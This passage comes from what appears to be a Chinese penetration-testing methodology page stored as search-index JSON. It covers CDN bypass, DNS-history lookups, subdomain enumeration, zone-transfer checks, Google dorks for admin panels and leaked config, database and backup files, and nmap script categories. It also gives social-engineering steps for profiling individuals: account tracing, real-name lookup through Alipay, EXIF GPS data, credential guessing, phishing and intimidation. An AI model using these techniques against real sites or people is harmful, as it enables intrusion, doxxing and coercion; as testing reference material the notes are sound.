\u5730\u5740\u662f\u5426\u552f\u4e00\uff0c\u5982\u679c\u4e0d\u552f\u4e00\u591a\u534a\u662f\u4f7f\u7528\u4e86CDN\uff0c \u591a\u5730 Ping \u7f51\u7ad9\u6709\uff1a \u200b http://ping.chinaz.com/ \u200b http://ping.aizhan.com/ \u200b http://ce.cloud.360.cn/ \u200b \u65b9\u6cd52\uff1a \u8bd5\u7528nslookup\u8fdb\u884c\u68c0\u6d4b\uff0c\u5982\u679c\u8fd4\u56de\u57df\u540d\u89e3\u6790\u5bf9\u5e94\u591a\u4e2aIP\uff0c\u90a3\u4e48\u591a\u534a\u662f\u8bd5\u7528\u4e86CDN. \u200b nslookup example.com \u200b \u65b9\u6cd53: \u200b \u5728\u7ebf\u5de5\u5177\u67e5\u770b\u662f\u5426\u5b58\u5728CDN\uff0c\u53ef\u4ee5\u53c2\u8003\u4ee5\u4e0b\u7ad9\u70b9: \u200b http://www.cdnplanet.com/tools/cdnfinder/ \u200b http://www.ipip.net/ip.html \u200b \u7ed5\u8fc7CDN\u67e5\u627e\u7f51\u7ad9\u771f\u5b9eIP \u200b 1.\u67e5\u8be2\u5386\u53f2DNS\u8bb0\u5f55(ip\u7684\u5386\u53f2\u89e3\u6790\u57df\u540d\uff0c\u57df\u540d\u7684\u5386\u53f2\u89e3\u6790ip) \u67e5\u770b IP \u4e0e \u57df\u540d\u7ed1\u5b9a\u7684\u5386\u53f2\u8bb0\u5f55\uff0c\u53ef\u80fd\u4f1a\u5b58\u5728\u4f7f\u7528 CDN \u524d\u7684\u8bb0\u5f55\uff0c\u76f8\u5173\u67e5\u8be2\u7f51\u7ad9\u6709\uff1a \u200b https://dnsdb.io/zh-cn/ \u200b https://x.threatbook.cn/ https://censys.io/ipv4?q=baidu.com \u975e\u5e38\u725b\u903c\u7684IP\u8bb0\u5f55\u7ad9\uff0c\u8fd8\u80fd\u5206\u6790\u5185\u94fe\u4e4b\u7c7b\u627e\u51fa\u53ef\u80fd\u7684IP\u5730\u5740\uff0c\u6b64\u5916\u8fd8\u4f1a\u8bb0\u5f55\u5386\u53f2\u3002 \u200b viewdns.info \u540c\u6837\u662f\u4e2a\u4ee4\u7ad9\u957f\u5341\u5206\u86cb\u75bc\u7684DNS\u5386\u53f2\u8bb0\u5f55\u7f51\u7ad9\uff0c\u8bb0\u5f55\u4e86\u51e0\u5e74\u5185\u7684\u66f4\u6539\u8bb0\u5f55\u3002 securitytrails.com https://site.ip138.com/ \u200b \u5e9e\u5927\u7684DNS\u5386\u53f2\u6570\u636e\u5e93\uff0c\u53ef\u4ee5\u67e5\u51fa\u51e0\u5e74\u5185\u7f51\u7ad9\u7528\u8fc7\u7684IP\u3001\u673a\u623f\u4fe1\u606f\u7b49\u3002 iphostinfo.com \u200b \u6ce8\u610f\uff1a\u8fd9\u4e2a\u7f51\u7ad9\u53ef\u4ee5\u904d\u5386FTP\u3001MX\u8bb0\u5f55\u548c\u5e38\u89c1\u4e8c\u7ea7\u57df\u540d\uff0c\u6709\u4e9b\u7ad9\u957f\u559c\u6b22\u628a\u90ae\u7bb1\u670d\u52a1\u4e5f\u653e\u5728\u81ea\u5df1\u4e3b\u673a\u4e0a\uff0c\u4fa7\u9762\u6cc4\u9732\u4e86\u771f\u5b9e\u7684IP\u5730\u5740\uff0c\u901a\u8fc7\u8fd9\u4e2a\u7f51\u7ad9\u53ef\u4ee5\u8fdb\u884c\u68c0\u67e5\u3002 \u200b 2.\u67e5\u8be2\u5b50\u57df\u540d\uff08\u6377\u5f84\uff0c\u53bb\u4f17\u6d4b\u5e73\u53f0\u3001github\u627e\u5b98\u65b9\u53d1\u5e03\u8fc7\u7684\uff09 \u6ce8\u610f\uff1a\u6709\u53ef\u80fd\u6709\u4e9b\u7ad9\u957f\u53ea\u7ed9\u4e3b\u7ad9\u6216\u6d41\u91cf\u5927\u7684\u5b50\u57df\u540d\u505a\u4e86CDN,\u800c\u5f88\u591a\u5b50\u57df\u540d\u90fd\u662f\u548c\u4e3b\u7ad9\u5728\u540c\u4e00\u53f0\u670d\u52a1\u5668\u4e0a\uff0c\u6216\u8005 C\u6bb5\u4e2d\uff0c\u8fd9\u6837\u53ef\u4ee5\u901a\u8fc7**\u5b50\u57df\u540d\u6765\u8f85\u52a9\u627e\u5230\u7f51\u7ad9\u771f\u5b9eIP** \u7206\u7834\u5b50\u57df\u540d: layer\u5b50\u57df\u540d\u6316\u6398\u673a\uff08\u5b57\u5178\u8981\u81ea\u5df1\u4e30\u5bcc\uff09 http://z.zcjun.com/(\u5728\u7ebf\u5b50\u57df\u540d\u6316\u6398 ) fuzzdomain \u5f88\u597d\u7528\uff0c\u901f\u5ea6\u5feb \u641c\u7d22\u5f15\u64ce\u62ff\u5b50\u57df\u540d\u3001\u65c1\u7ad9\uff08\u540cIP\u7f51\u7ad9\uff09\u3001C\u6bb5\uff1a \u53ef\u7528\u641c\u7d22\u5f15\u64ce\u8bed\u6cd5\u67e5\u8be2\u5b50\u57df\u540d\uff1a \u8c37\u6b4c \u767e\u5ea6 bing \u641c\u72d7(\u641c\u7d22\u5fae\u4fe1\u6587\u7ae0) \u96c5\u864e \u7565\u6709\u5dee\u5f02 \u8be6\u7ec6\u7528\u6cd5: \u200b \uff081\uff09site: =\u4e3b\u57df\u540d,\u641c\u7d22\u5176\u4e3b\u8981\u57df\u540d\u4e0b\u9762\u7684\u5b50\u57df\u540d \u200b \uff082\uff09allintext: = \u641c\u7d22\u6587\u672c,\u4f46\u4e0d\u5305\u62ec\u7f51\u9875\u6807\u9898\u548c\u94fe\u63a5 \u200b \uff083\uff09allinlinks: = \u641c\u7d22\u94fe\u63a5, \u4e0d\u5305\u62ec\u6587\u672c\u548c\u6807\u9898\u3002 \u200b \uff084\uff09related:URL = \u5217\u51fa\u4e8e\u76ee\u6807URL\u5730\u5740\u6709\u5173\u7684\u7f51\u9875\u3002 \u200b \uff085\uff09link:URL = \u5217\u51fa\u5230\u94fe\u63a5\u5230\u76ee\u6807URL\u7684\u7f51\u9875\u6e05\u5355\u3002 \u200b \uff086\uff09\u4f7f\u7528\u201c-\u201d\u53bb\u6389\u4e0d\u60f3\u770b\u7684\u7ed3\u679c\uff0c\u4f8b\u5982site: baidu.com - image.baidu.com \u767e\u5ea6\u8bed\u6cd5\uff1a https://www.cnblogs.com/k0xx/p/12794452.html \u8c37\u6b4c\u8bed\u6cd5\uff1a https://blog.csdn.net/u012991692/article/details/82937100?biz_id=102&utm_term=Googlehack&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-82937100&spm=1018.2118.3001.4187 GHDB\uff1a https://www.exploit-db.com/google-hacking-database 3.\u8d44\u4ea7\u641c\u7d22(\u65c1\u7ad9\\C\u6bb5\\\u7279\u5f81): \u200b https://www.shodan.io (\u5173\u952e\u5b57\u7206ip) \u200b https://fofa.so https://www.zoomeye.org/ \u200b http://www.yunsee.cn/info.html \uff08\u4e91\u6089\u5728\u7ebf\u8d44\u4ea7\u5e73\u53f0) http://subdomain.chaxun.la \uff08\u67e5\u8be2\u5566\uff09 https://www.virustotal.com/gui/home/search https://dnsdumpster.com/ https://duckduckgo.com \uff08\u4e00\u4e2a\u4e0d\u4f1a\u5b58\u50a8\u4f60\u4e2a\u4eba\u4fe1\u606f\u7684\u641c\u7d22\u5f15\u64ce\uff09 https://crt.sh/ \uff08SSL\u8bc1\u4e66\u67e5\u8be2\uff09 https://icp.aizhan.com/(\u57df\u540d\u5907\u6848 ) 4.\u5bf9\u65b9\u670d\u52a1\u5668\u7ed9\u81ea\u5df1\u53d1\u90ae\u4ef6\u66b4\u9732IP 5.APP\u5ba2\u6237\u7aef\u7206ip","title":"1.1 \u57df\u540d\u6ce8\u518c\u4fe1\u606f**"},{"location":"redteam/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/#12-dns","text":"\u76ee\u7684: \u6ce8\u518c\u8005\u540d\u79f0\u53ca\u90ae\u7bb1,\u518d\u53cd\u67e5\u5176\u4ed6\u57df\u540d \u624b\u673a\u53f7 \u5ea7\u673a\u53f7 ASN\u53f7 \u5730\u5740","title":"1.2 DNS\u4fe1\u606f\u67e5\u8be2"},{"location":"redteam/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/#dns","text":"https://dnsdumpster.com/ https://www.dnsdb.io \uff08DNS\u641c\u7d22\u5f15\u64ce\uff09 http://searchdns.netcraft.com http://whois.nawang.cn/ https://whois.aliyun.com/ https://whois.west.cn/ http://whois.chinaz.com/ (\u7ad9\u957f\u4e4b\u5bb6) https://www.tianyancha.com/ \uff08\u5929\u773c\u67e5\uff09 http://www.gsxt.gov.cn/index.html \uff08\u56fd\u5bb6\u4f01\u4e1a\u4fe1\u7528\u4fe1\u606f\u7cfb\u7edf\uff09 www.beianbeian.com/ \uff08ICP\u5907\u6848\u67e5\u8be2\uff09","title":"\u5728\u7ebfDNS\u4fe1\u606f\u67e5\u8be2\u5de5\u5177"},{"location":"redteam/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/#13","text":"\u57df\u4f20\u9001\u662f\u4e00\u79cdDNS\u4e8b\u52a1\uff0c\u7528\u4e8e\u5728\u4e3b\u4ece\u670d\u52a1\u5668\u95f4\u590d\u5236DNS\u8bb0\u5f55\u3002\u867d\u7136\u5982\u4eca\u5df2\u7ecf\u5f88\u5c11\u89c1\u4e3b\u673a\u4f1a\u5f00\u542f\uff0c\u4f46\u662f\u8fd8\u662f\u5e94\u8be5\u786e\u8ba4\u4e00\u4e0b\u3002\u4e00\u65e6\u5b58\u5728\u57df\u4f20\u9001\u6f0f\u6d1e\uff0c\u5c31\u610f\u5473\u7740\u4f60\u83b7\u53d6\u4e86\u6574\u4e2a\u57df\u4e0b\u9762\u6240\u6709\u7684\u8bb0\u5f55\u3002 dnsrecon -d example.com dnsenum example.com \u5305\u542b\u81ea\u52a8\u68c0\u6d4b\u57df\u4f20\u9001\u6f0f\u6d1e","title":"1.3 \u6d4b\u8bd5\u57df\u4f20\u9001\u6f0f\u6d1e"},{"location":"redteam/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/#14","text":"github\u6cc4\u9732\uff1a in:name test #\u4ed3\u5e93\u6807\u9898\u641c\u7d22\u542b\u6709\u5173\u952e\u5b57 SpringCloud in:descripton test #\u4ed3\u5e93\u63cf\u8ff0\u641c\u7d22\u542b\u6709\u5173\u952e\u5b57 in:readme test #Readme\u6587\u4ef6\u641c\u7d20\u542b\u6709\u5173\u952e\u5b57 stars:>3000 test #stars\u6570\u91cf\u5927\u4e8e3000\u7684\u641c\u7d22\u5173\u952e\u5b57 stars:1000..3000 test #stars\u6570\u91cf\u5927\u4e8e1000\u5c0f\u4e8e3000\u7684\u641c\u7d22\u5173\u952e\u5b57 forks:>1000 test #forks\u6570\u91cf\u5927\u4e8e1000\u7684\u641c\u7d22\u5173\u952e\u5b57 forks:1000..3000 test #forks\u6570\u91cf\u5927\u4e8e1000\u5c0f\u4e8e3000\u7684\u641c\u7d22\u5173\u952e\u5b57 size:>=5000 test #\u6307\u5b9a\u4ed3\u5e93\u5927\u4e8e5000k(5M)\u7684\u641c\u7d22\u5173\u952e\u5b57 pushed:>2019-02-12 test #\u53d1\u5e03\u65f6\u95f4\u5927\u4e8e2019-02-12\u7684\u641c\u7d22\u5173\u952e\u5b57 created:>2019-02-12 test #\u521b\u5efa\u65f6\u95f4\u5927\u4e8e2019-02-12\u7684\u641c\u7d22\u5173\u952e\u5b57 user:test #\u7528\u6237\u540d\u641c\u7d20 license:apache-2.0 test #\u660e\u786e\u4ed3\u5e93\u7684 LICENSE \u641c\u7d22\u5173\u952e\u5b57 language:java test #\u5728java\u8bed\u8a00\u7684\u4ee3\u7801\u4e2d\u641c\u7d22\u5173\u952e\u5b57 user:test in:name test #\u7ec4\u5408\u641c\u7d22,\u7528\u6237\u540dtest\u7684\u6807\u9898\u542b\u6709test\u7684 \u7f51\u76d8\u6cc4\u9732\uff1a \u5404\u79cd\u4e91\u7f51\u76d8\uff0c\u8be6\u89c1\u866b\u90e8\u843d\u641c\u7d22: magnet.chongbuluo.com \u654f\u611f\u8def\u5f84\u626b\u63cf\uff1a https://github.com/ring04h/weakfilescan","title":"1.4 \u4e1a\u52a1\u76f8\u5173"},{"location":"redteam/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/#2-osint","text":"","title":"2. OSINT \u516c\u5f00\u60c5\u62a5\u6536\u96c6"},{"location":"redteam/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/#21","text":"\u67e5\u770b\u6ce8\u518c\u7684\u7f51\u7ad9\uff1a0xreg reg007 \u77e5\u9053\u8d26\u53f7\u53bb\u5df2\u6ce8\u518c\u7684\u7f51\u7ad9\u627e\u56de\u5bc6\u7801\uff0c\u53ef\u4ee5\u770b\u5230\u6253\u7801\u540e\u7684\u7528\u6237\u540d\u3001\u90ae\u7bb1\u3001\u771f\u5b9e\u59d3\u540d\u7b49\u4fe1\u606f\uff0c\u5982\u679c\u8fd0\u6c14\u597d\u6ca1\u51c6\u80fd\u4ece\u6570\u636e\u5305\u6216html\u4e2d\u627e\u5230\u672a\u88ab\u6253\u7801\u7684\u4fe1\u606f \u53ef\u4ee5\u4ece\u8fd9\u4e9b\u65b9\u9762\u5224\u65ad\u7528\u6237\u662f\u5426\u6ce8\u518c\u8fc7 \u627e\u56de\u5bc6\u7801 \u8f93\u5165\u8d26\u53f7\uff0c\u5982\u679c\u8fdb\u5165\u4e0b\u4e00\u6b65\u4e86\u5219\u8be5\u8d26\u53f7\u5b58\u5728 \u767b\u5f55 \u8f93\u5165\u8d26\u53f7\u548c\u5bc6\u7801\uff0c\u5982\u679c\u63d0\u793a\u5bc6\u7801\u9519\u8bef\uff0c\u5219\u8868\u793a\u8be5\u7528\u6237\u5df2\u5b58\u5728 \u6ce8\u518c \u586b\u5199\u8d26\u53f7\u65f6\u4e00\u822c\u7f51\u7ad9\u4f1a\u53bb\u68c0\u6d4b\u8be5\u8d26\u53f7\u662f\u5426\u5df2\u5b58\u5728\uff0c\u5982\u679c\u5df2\u5b58\u5728\u5219\u4f1a\u63d0\u793a\u4e0d\u53ef\u91cd\u590d\u6ce8\u518c \u77e5\u9053QQ \u901a\u8fc7QQ\u90ae\u7bb1\u548cQQ\u53f7\u641c\u7d22\u652f\u4ed8\u5b9d\u3001\u6dd8\u5b9d\u8d26\u53f7\u7b49\u5176\u4ed6\u53ef\u80fd\u7684\u5e38\u7528\u5e73\u53f0 \u53bb\u817e\u8baf\\\u65b0\u6d6a\u5fae\u535a\u641c\u7d22 \u901a\u8fc7\u5fae\u4fe1\u641c\u7d22 \u67e5\u770bQQ\u7a7a\u95f4\\\u76f8\u518c\\\u5730\u533a\\\u661f\u5ea7\\\u751f\u65e5\\\u6635\u79f0(\u540e\u7eed\u6784\u5efa\u5b57\u5178\u4ee5\u53ca\u8de8\u5e73\u53f0\u641c\u96c6) \u901a\u8fc7\u8bf4\u8bf4\u3001\u7559\u8a00\u3001\u65e5\u5fd7\u627e\u5230\u5176\u597d\u53cb \u52a0QQ\u9493\u9c7c\\\u5171\u540c\u597d\u53cb\\\u53ef\u80fd\u8ba4\u8bc6\u7684\u4eba \u77e5\u9053\u624b\u673a\u53f7 \u641c\u7d22QQ\u3001\u5fae\u4fe1\u3001\u9489\u9489\u7b49\u793e\u4ea4\u8d26\u53f7 \u5728\u6bd4\u8f83\u706b\u7684\u4e00\u4e9bAPP\u548c\u7f51\u7ad9\u4e0a\u6ce8\u518c\u6216\u5fd8\u8bb0\u5bc6\u7801\u6765\u5224\u65ad\u662f\u5426\u6ce8\u518c\u8fc7\u8d26\u53f7 \u67e5\u8be2\u652f\u4ed8\u5b9d\u8d26\u53f7\uff0c\u5c1d\u8bd5\u8f93\u5165\u5e38\u89c1\u59d3\u6c0f\u83b7\u53d6\u540d\u5b57(\u8f6c\u8d26\u5230\u8be5\u624b\u673a\u53f7,\u4f1a\u63d0\u793a\u8f93\u5165\u59d3\u6c0f\u9a8c\u8bc1) \u901a\u8fc7\u5bf9\u65b9\u7684\u804c\u4e1a\u3001\u5174\u8da3\u627e\u5230\u8be5\u9886\u57df\u77e5\u540d\u5ea6\u8f83\u9ad8\u7684\u793e\u4ea4\u7f51\u7ad9\u53cd\u67e5 \u6839\u636e\u5728QQ\u7a7a\u95f4\u3001\u670b\u53cb\u5708\u7b49\u52a8\u6001\u7528\u767e\u5ea6\u8bc6\u56fe\u8bc6\u522b\u7167\u7247 \u5728\u5fae\u535a\u3001ins\u3001Twitter\u3001fb\u3001\u767e\u5ea6\u8d34\u5427\u641c\u7d22\u76f8\u8fd1\u5173\u952e\u5b57\uff0c\u6309\u5730\u57df\u3001\u5e74\u9f84\u3001\u7537\u5973\u3001\u7528\u6237\u540d\u7b49\u7b5b\u9009 \u7559\u610f\u793e\u4ea4\u52a8\u6001 \u53d1\u5e03\u65f6\u95f4\u7ebf \u4f7f\u7528\u4ec0\u4e48\u5ba2\u6237\u7aef iPhone Android\u8fd8\u662f\u6d4f\u89c8\u5668 \u9488\u5bf9\u5ba2\u6237\u7aef\u9884\u5148\u5236\u5b9aexploit \u200b \u6ce8\u610f\u6bcf\u4e00\u6761\u94fe\u63a5 / \u56fe\u7247 / \u89c6\u9891 \u94fe\u63a5\u53ef\u80fd\u5305\u542b\u7528\u6237ID \u56fe\u7247\u53ef\u80fd\u5305\u542b\u6c34\u5370\uff0cexif\u53ef\u80fd\u4f1a\u6709GPS\u5b9a\u4f4d\u548c\u624b\u673a\u7c7b\u578b,\u56fe\u7247\u5185\u5bb9\u7279\u5f81 \u89c6\u9891\u4e5f\u6709\u53ef\u80fd\u6709\u6c34\u5370\u66b4\u9732\u793e\u4ea4\u8d26\u53f7ID,\u62cd\u6444\u5730\u70b9 \u4ece\u6700\u65e9\u53d1\u5e03\u7684\u52a8\u6001\u770b\u8d77\uff0c\u4f1a\u6709\u5f88\u5927\u6536\u83b7 \u4e00\u822c\u5f97\u5230\u4e00\u4e2a\u8d26\u53f7\u7684\u5bc6\u7801\u5c31\u76f8\u5f53\u4e8e\u5f97\u5230\u4e86\u5176\u4ed6\u8d26\u53f7\u7684\u5bc6\u7801 \u4e00\u822c\u4eba\u4e0d\u540c\u8d26\u53f7\u7684\u7528\u6237\u540d\u90fd\u662f\u76f8\u540c\u6216\u76f8\u8fd1\u7684 \u4e00\u822c\u4eba\u7684\u793e\u4ea4\u8d26\u53f7\u5934\u50cf\u7528\u7684\u90fd\u662f\u4e00\u6837\u7684 \u5c1d\u8bd5\u7834\u89e3\u793e\u4fdd\u3001\u516c\u79ef\u91d1\u8d26\u53f7\u3001\u8eab\u4efd\u8bc1\u53f7\uff08\u51fa\u751f\u5730\u3001\u751f\u65e5\u3001\u661f\u5ea7\u3001\u6d3e\u51fa\u6240\u4ee3\u7801\uff09 \u866b\u90e8\u843d\u5feb\u641c\u4e4b\u6587\u4ef6\u641c\u7d22: https://search.chongbuluo.com/ qq\u7fa4\u3001\u7fa4\u6587\u4ef6\u3001\u8d34\u5427\u8bba\u575b\u3001\u76ee\u6807\u81ea\u7528\u8bba\u575b\u7b49\u793e\u4ea4\u5e73\u53f0\u9493\u9c7c\u548c\u4fe1\u606f\u6cc4\u9732(\u722c\u90ae\u7bb1\u7b49\u4fe1\u606f) \u7535\u5b50\u90ae\u4ef6\u4f2a\u9020\u3001\u7f51\u7edc\u9493\u9c7c \u4e0b\u8f7d\u6076\u610f\u7a0b\u5e8f \u8f93\u5165\u654f\u611f\u4fe1\u606f \u5927\u90e8\u5206\u4fe1\u606f\u53ef\u4ee5\u7528\u6765\u751f\u6210\u5bc6\u7801\u5b57\u5178 \u5bf9\u4eba\uff1a\u8bf4\u670d\u5bf9\u65b9\u8fbe\u6210\u4e00\u81f4\u3001\u6050\u5413\u5bf9\u65b9\uff08\u654f\u611f\u8bcd\u3001\u6f0f\u6d1e\u3001\u75c5\u6bd2\u3001\u6743\u5a01\u673a\u6784\u540d\u79f0\u3001\uff09\uff0c\u9493\u9c7c\u83b7\u53d6\u4fe1\u606f","title":"2.1\u793e\u4f1a\u5de5\u7a0b\u5b66\u6280\u5de7(\u7f51\u7edc\u5b89\u5168\u653b\u9632\uff1a\u793e\u4f1a\u5de5\u7a0b\u5b66\u4e4b\u6982\u8ff0)"},{"location":"redteam/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/#22osint","text":"","title":"2.2\u641c\u7d22\u5f15\u64ceOSINT"},{"location":"redteam/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/#google-hackingbaidubingsouhugithub","text":"**GoogleHacking**\u5e38\u7528\u8bed\u6cd5 1\u3001intext\uff1a\uff08\u4ec5\u9488\u5bf9Google\u6709\u6548\uff09 \u628a\u7f51\u9875\u4e2d\u7684\u6b63\u6587\u5185\u5bb9\u4e2d\u7684\u67d0\u4e2a\u5b57\u7b26\u4f5c\u4e3a\u641c\u7d22\u7684\u6761\u4ef6 2\u3001intitle\uff1a \u628a\u7f51\u9875\u6807\u9898\u4e2d\u7684\u67d0\u4e2a\u5b57\u7b26\u4f5c\u4e3a\u641c\u7d22\u7684\u6761\u4ef6 3\u3001cache\uff1a \u641c\u7d22\u641c\u7d22\u5f15\u64ce\u91cc\u5173\u4e8e\u67d0\u4e9b\u5185\u5bb9\u7684\u7f13\u5b58\uff0c\u53ef\u80fd\u4f1a\u5728\u8fc7\u671f\u5185\u5bb9\u4e2d\u53d1\u73b0\u6709\u4ef7\u503c\u7684\u4fe1\u606f 4\u3001filetype/ext\uff1a \u6307\u5b9a\u4e00\u4e2a\u683c\u5f0f\u7c7b\u578b\u7684\u6587\u4ef6\u4f5c\u4e3a\u641c\u7d22\u5bf9\u8c61 5\u3001inurl\uff1a \u641c\u7d22\u5305\u542b\u6307\u5b9a\u5b57\u7b26\u7684URL 6\u3001site\uff1a \u5728\u6307\u5b9a\u7684(\u57df\u540d)\u7ad9\u70b9\u641c\u7d22\u76f8\u5173\u5185\u5bb9 GoogleHacking\u5176\u4ed6\u8bed\u6cd5 1\u3001\u5f15\u53f7 \u201d \u201d \u628a\u5173\u952e\u5b57\u6253\u4e0a\u5f15\u53f7\u540e\uff0c\u628a\u5f15\u53f7\u90e8\u5206\u4f5c\u4e3a\u6574\u4f53\u6765\u641c\u7d22 2\u3001or \u540c\u65f6\u641c\u7d22\u4e24\u4e2a\u6216\u66f4\u591a\u7684\u5173\u952e\u5b57 3\u3001link \u641c\u7d22\u67d0\u4e2a\u7f51\u7ad9\u7684\u94fe\u63a5 link: baidu.com \u5373\u8fd4\u56de\u6240\u6709\u548cbaidu\u505a\u4e86\u94fe\u63a5\u7684URL 4\u3001info \u67e5\u627e\u6307\u5b9a\u7ad9\u70b9\u7684\u4e00\u4e9b\u57fa\u672c\u4fe1\u606f **GoogleHackingDatabase: google-hacking-database GoogleHacking\u5178\u578b\u7528\u6cd5(\u7279\u5b9a\u8d44\u4ea7\u7684\u4e07\u80fd\u5bc6\u7801\u4e5f\u8981\u79ef\u7d2f) \u7ba1\u7406\u540e\u53f0\u5730\u5740 site: target.com intext:\u7ba1\u7406 | \u540e\u53f0 | \u540e\u53f0\u7ba1\u7406 | \u767b\u9646 | \u767b\u5f55 | \u7528\u6237\u540d | \u5bc6\u7801 | \u7cfb\u7edf | \u8d26\u53f7 | login | system site: target.com inurl:login | inurl:admin | inurl:manage | inurl:manager | inurl:admin_login | inurl:system | inurl:backend site: target.com intitle:\u7ba1\u7406 | \u540e\u53f0 | \u540e\u53f0\u7ba1\u7406 | \u767b\u9646 | \u767b\u5f55 \u4e0a\u4f20\u7c7b\u6f0f\u6d1e\u5730\u5740 site: target.com inurl:file site: target.com inurl:upload \u6ce8\u5165\u9875\u9762 site: target.com inurl:php?id= \u7f16\u8f91\u5668\u9875\u9762 site: target.com inurl:ewebeditor \u76ee\u5f55\u904d\u5386\u6f0f\u6d1e site: target.com intitle:index.of SQL\u9519\u8bef site: target.com intext:\"sql syntax near\" | intext:\"syntax error has occurred\" | intext:\"incorrect syntax near\" | intext:\"unexpected end of SQL command\" | intext:\"Warning: mysql_connect()\" | intext:\u201dWarning: mysql_query()\" | intext:\u201dWarning: pg_connect()\" phpinfo() site: target.com ext:php intitle:phpinfo \"published by the PHP Group\" \u914d\u7f6e\u6587\u4ef6\u6cc4\u9732 site: target.com ext:.xml | .conf | .cnf | .reg | .inf | .rdp | .cfg | .txt | .ora | .ini \u6570\u636e\u5e93\u6587\u4ef6\u6cc4\u9732 site: target.com ext:.sql | .dbf | .mdb | .db \u65e5\u5fd7\u6587\u4ef6\u6cc4\u9732 site: target.com ext:.log \u5907\u4efd\u548c\u5386\u53f2\u6587\u4ef6\u6cc4\u9732 site: target.com ext:.bkf | .bkp | .old | .backup | .bak | .swp | .rar | .txt | .zip | .7z | .sql | .tar.gz | .tgz | .tar \u516c\u5f00\u6587\u4ef6\u6cc4\u9732 site: target.com filetype:.doc | .docx | .xls | .xlsx | .ppt | .pptx | .odt | .pdf | .rtf | .sxw | .psw | .csv \u90ae\u7bb1\u4fe1\u606f site: target.com intext:@ target.com site: target.com \u90ae\u4ef6 site: target.com email \u793e\u5de5\u4fe1\u606f site: target.com intitle:\u8d26\u53f7 | \u5bc6\u7801 | \u5de5\u53f7 | \u5b66\u53f7 | \u8eab\u4efd\u8bc1","title":"Google Hacking(baidu\\bing\\souhu\\github)"},{"location":"redteam/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/#23","text":"Wappalyzer\uff1a\u8bc6\u522b\u7f51\u7ad9\u4f7f\u7528\u7684\u4e2d\u95f4\u4ef6\u53ca\u5176\u7248\u672c\uff0c\u518d\u53bb\u6f0f\u6d1e\u5e93\u548c\u641c\u7d22\u5f15\u64ce\u627e\u516c\u5f00\u62ab\u9732\u7684\u6f0f\u6d1e SwitchOmega\uff1a\u5feb\u6377\u5207\u6362\u4ee3\u7406 shodan\uff1a\u8bc6\u522b\u5f00\u653e\u7aef\u53e3\uff0c\u4e3b\u673a\u670d\u52a1\u7b49 hacktools:\u7efc\u5408\u63d2\u4ef6,\u5f88\u5f3a\u5927 firefox\u6e17\u900f\u4fbf\u643a\u7248,\u5de5\u5177\u96c6\u6210\u5f88\u591a \u6ce8\u610f\uff1a\u6839\u636e\u83b7\u5f97\u670d\u52a1\u3001\u4e2d\u95f4\u4ef6\u4fe1\u606f\u3001\u7f16\u8f91\u5668\u7248\u672c\u3001\u6570\u636e\u5e93\u7b49OSINT\u53bb\u5404\u5927\u6f0f\u6d1e\u5e93\u3001\u641c\u7d22\u5f15\u64ce\u627e\u6f0f\u6d1e\u5229\u7528","title":"2.3\u6d4f\u89c8\u5668\u5b9e\u7528\u63d2\u4ef6\uff1a"},{"location":"redteam/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/#24cnvd","text":"\u4e4c\u4e91\u5e93\\\u4e4c\u4e91\u955c\u50cf\\GHDB\\CNVD\u7b49\u516c\u5f00\u6f0f\u6d1e\u5e93","title":"2.4\u4e4c\u4e91\u548ccnvd"},{"location":"redteam/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/#0x02-mapping","text":"\u5728\u4e00\u6b21\u6e17\u900f\u6d4b\u8bd5\u8fc7\u7a0b\u4e2d\uff0cMapping\u7684\u76ee\u7684\u662f\u7ad9\u5728\u4e00\u4e2a\u666e\u901a\u7528\u6237\u7684\u89d2\u5ea6\u53bb\u4e86\u89e3\u6574\u4e2a\u5e94\u7528\u7684\u5168\u8c8c\u3002","title":"0x02 Mapping"},{"location":"redteam/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/#1_1","text":"","title":"1.\u4e3b\u52a8\u626b\u63cf"},{"location":"redteam/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E5%BD%92%E7%BA%B3/#11_1","text":"nmap\u7684\u4f7f\u7528: \u811a\u672c\u626b\u63cf\uff0c\u9690\u853d\u626b\u63cf\uff0c\u7aef\u53e3\u626b\u63cf\uff0c\u670d\u52a1\u8bc6\u522b\uff0cOS\u8bc6\u522b\uff0c\u63a2\u6d4bWAF nmap\u811a\u672c\u4e3b\u8981\u5206\u4e3a\u4ee5\u4e0b\u51e0\u7c7b\uff0c\u5728\u626b\u63cf\u65f6\u53ef\u6839\u636e\u9700\u8981\u8bbe\u7f6e\u2013script=\u7c7b\u522b\u8fd9\u79cd\u65b9\u5f0f\u8fdb\u884c\u6bd4\u8f83\u7b3c\u7edf\u7684\u626b\u63cf\uff1a auth: \u8d1f\u8d23\u5904\u7406\u9274\u6743\u8bc1\u4e66\uff08\u7ed5\u5f00\u9274\u6743\uff09\u7684\u811a\u672c broadcast: \u5728\u5c40\u57df\u7f51\u5185\u63a2\u67e5\u66f4\u591a\u670d\u52a1\u5f00\u542f\u72b6\u51b5\uff0c\u5982dhcp/dns/sqlserver\u7b49\u670d\u52a1 brute: \u63d0\u4f9b\u66b4\u529b\u7834\u89e3\u65b9\u5f0f\uff0c\u9488\u5bf9\u5e38\u89c1\u7684\u5e94\u7528\u5982http/snmp\u7b49 default: 